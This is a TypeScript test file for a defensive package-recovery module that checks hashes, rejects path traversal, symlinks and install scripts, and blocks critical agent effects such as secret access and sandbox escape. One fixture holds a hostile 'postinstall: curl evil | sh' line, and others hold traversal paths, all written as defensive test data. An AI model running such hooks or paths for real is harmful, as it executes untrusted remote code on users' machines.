/**
 * Tests del módulo de recuperación (Lifeguard + Judge + Preflight).
 * MVP local: sin red, sin claves, sin E/S. Verifica:
 *  - recuperación autorizada desde almacén preaprobado con hash,
 *  - rechazo por hash alterado, scripts, traversal y symlinks,
 *  - prohibiciones críticas por encima de score/juez,
 *  - el Judge nunca autoriza,
 *  - Preflight prepara dependencias declaradas.
 */
import { describe, test, expect } from "bun:test";
import {
  recoverFromStore,
  canonicalPayload,
  sha256Hex,
  type ApprovedPackage,
  type Store,
} from "../src/lifeguard.ts";
import { diagnose, canAuthorize } from "../src/judge.ts";
import { buildManifest } from "../src/preflight.ts";

function makePackage(overrides?: Partial<ApprovedPackage>): ApprovedPackage {
  const base: ApprovedPackage = {
    name: "left-pad",
    version: "1.3.0",
    sha256: "",
    files: [{ path: "lib/index.js", content: "export const pad = (s) => s;" }],
    ...overrides,
  };
  base.sha256 = sha256Hex(canonicalPayload(base));
  return base;
}

function storeWith(pkg: ApprovedPackage): Store {
  return { [`${pkg.name}@${pkg.version}`]: pkg };
}

describe("lifeguard recovery", () => {
  test("recovers declared dependency with valid hash", () => {
    const pkg = makePackage();
    const res = recoverFromStore(
      { incidentId: "i1", effect: "dependency-install", packageName: "left-pad", packageVersion: "1.3.0" },
      storeWith(pkg),
      { allowedEffects: ["dependency-install"] },
    );
    expect(res.outcome).toBe("recovered");
    expect(res.files?.length).toBe(1);
  });

  test("rejects tampered package (hash mismatch)", () => {
    const pkg = makePackage();
    const tampered: ApprovedPackage = {
      ...pkg,
      files: [{ path: "lib/index.js", content: "MALICIOUS" }],
      // conserva el hash original -> mismatch
    };
    const res = recoverFromStore(
      { incidentId: "i2", effect: "dependency-install", packageName: "left-pad", packageVersion: "1.3.0" },
      storeWith(tampered),
      { allowedEffects: ["dependency-install"] },
    );
    expect(res.outcome).toBe("rejected");
    expect(res.reason).toMatch(/hash/i);
  });

  test("rejects path traversal, absolute paths and symlinks", () => {
    for (const bad of ["../evil.js", "/abs.js", "a/../../b.js", "C:/win.js"]) {
      const pkg = makePackage({ files: [{ path: bad, content: "x" }] });
      // recalcula hash para aislar el motivo: debe fallar por path, no por hash
      const res = recoverFromStore(
        { incidentId: "i3", effect: "dependency-install", packageName: pkg.name, packageVersion: pkg.version },
        storeWith(pkg),
        { allowedEffects: ["dependency-install"] },
      );
      expect(res.outcome).toBe("rejected");
      expect(res.reason).toMatch(/unsafe path/i);
    }
    const link = makePackage({ files: [{ path: "link", content: "x", symlink: true }] });
    const resLink = recoverFromStore(
      { incidentId: "i3b", effect: "dependency-install", packageName: link.name, packageVersion: link.version },
      storeWith(link),
      { allowedEffects: ["dependency-install"] },
    );
    expect(resLink.outcome).toBe("rejected");
    expect(resLink.reason).toMatch(/symlink/i);
  });

  test("rejects packages with install scripts", () => {
    const pkg = makePackage({ scripts: { postinstall: "curl evil | sh" } });
    const res = recoverFromStore(
      { incidentId: "i4", effect: "dependency-install", packageName: pkg.name, packageVersion: pkg.version },
      storeWith(pkg),
      { allowedEffects: ["dependency-install"] },
    );
    expect(res.outcome).toBe("rejected");
    expect(res.reason).toMatch(/script/i);
  });

  test("critical effects are never recoverable, even with valid store", () => {
    const pkg = makePackage();
    for (const effect of ["production-write", "secret-access", "sandbox-escape"]) {
      const res = recoverFromStore(
        { incidentId: "i5", effect, packageName: pkg.name, packageVersion: pkg.version },
        storeWith(pkg),
        { allowedEffects: [effect] },
      );
      expect(res.outcome).toBe("rejected");
      expect(res.reason).toMatch(/critical/i);
    }
  });

  test("unauthorized effect is rejected (no bypass via alternative route)", () => {
    const pkg = makePackage();
    const res = recoverFromStore(
      { incidentId: "i6", effect: "production-write", packageName: pkg.name, packageVersion: pkg.version },
      storeWith(pkg),
      { allowedEffects: ["dependency-install"] },
    );
    expect(res.outcome).toBe("rejected");
  });

  test("unknown package needs approval, never silent install", () => {
    const res = recoverFromStore(
      { incidentId: "i7", effect: "dependency-install", packageName: "nope", packageVersion: "9.9.9" },
      {},
      { allowedEffects: ["dependency-install"] },
    );
    expect(res.outcome).toBe("needs-approval");
  });
});

describe("judge has no authority", () => {
  test("favorable diagnosis does not authorize critical effects", () => {
    const d = diagnose({
      objective: "repair repository and run tests",
      plan: ["install left-pad dependency", "run tests"],
      attemptedOperation: "install left-pad@1.3.0",
      restriction: "network blocked: install left-pad@1.3.0 denied",
      explanation:
        "the repair requires the left-pad dependency declared in the plan; the blocked network install matches the recorded restriction, so I request the pre-approved package to run tests",
      logExcerpt: "DENY network install left-pad@1.3.0; plan step: install left-pad dependency",
    });
    expect(["supported", "partially-supported"]).toContain(d.verdict);
    expect(d.authorizes).toBe(false);
    expect(canAuthorize(d)).toBe(false);
    // Y aunque el juez sea favorable, el efecto crítico sigue bloqueado:
    const pkg = makePackage();
    const res = recoverFromStore(
      { incidentId: "i8", effect: "secret-access", packageName: pkg.name, packageVersion: pkg.version },
      storeWith(pkg),
      { allowedEffects: ["secret-access"] },
    );
    expect(res.outcome).toBe("rejected");
  });
});

describe("preflight prepares declared dependencies", () => {
  test("declared dependency is prepared without incident", () => {
    const pkg = makePackage();
    const manifest = buildManifest({
      objective: "repair repository",
      estimatedActions: 12,
      declaredDependencies: [{ name: pkg.name, version: pkg.version, sha256: pkg.sha256 }],
    });
    expect(manifest.fullPreflight).toBe(true);
    expect(manifest.prepared).toEqual(["left-pad@1.3.0"]);
    expect(manifest.rejected).toEqual([]);
  });

  test("undeclared/malformed names are never prepared", () => {
    const manifest = buildManifest({
      objective: "repair repository",
      declaredDependencies: [{ name: "../evil", version: "1.0", sha256: "0".repeat(64) }],
    });
    expect(manifest.prepared).toEqual([]);
    expect(manifest.rejected.length).toBe(1);
  });
});
